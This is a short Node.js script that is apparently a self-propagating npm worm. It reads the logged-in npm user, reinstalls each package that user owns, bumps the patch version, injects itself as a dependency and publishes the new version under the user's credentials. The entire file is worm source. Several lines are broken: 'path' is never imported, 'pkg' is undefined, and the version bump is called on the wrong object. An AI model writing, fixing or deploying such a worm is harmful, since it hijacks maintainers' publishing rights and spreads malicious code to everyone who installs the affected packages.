var wormInfo = require("./package");
var npmUser  = require("npm-user");
var semver   = require("semver");
var child    = require("child_process");
var fs       = require("fs");

// get npm username
var username = child.execSync("npm whoami", { encoding: "utf8" }).trim();
if (!username) return;

wormInfo(username, function (err, data) {
  if (err) throw err;

  data.packages.forEach(function (pkgName) {
    // create dummy directory
    var cwd = path.join(__dirname, "." + pkgName);
    fs.mkdirSync(cwd);

    // create dummy node_modules directory
    var modulesLoc = path.join(cwd, "node_modules");
    fs.mkdirSync(modulesLoc);

    // path the module will be installed to
    var moduleLoc  = path.join(modulesLoc, pkgName);
    var packageLoc = path.join(moduleLoc, "package.json");

    // install package
    child.exec("npm install " + pkgName, { cwd: cwd }, function (err) {
      if (err) throw err;

      var packageJson = require(packageLoc);

      // bump the patch version
      pkg.version = semver.inc(packageJson, "patch");

      // add the worm to the dependencies :~)
      pkg.dependencies[wormInfo.name] = "*";

      // publish new version with updated package.json
      child.exec("npm publish", { cwd: moduleLoc }, function (err) {
        if (err) throw err;
      });
    });
  });
});
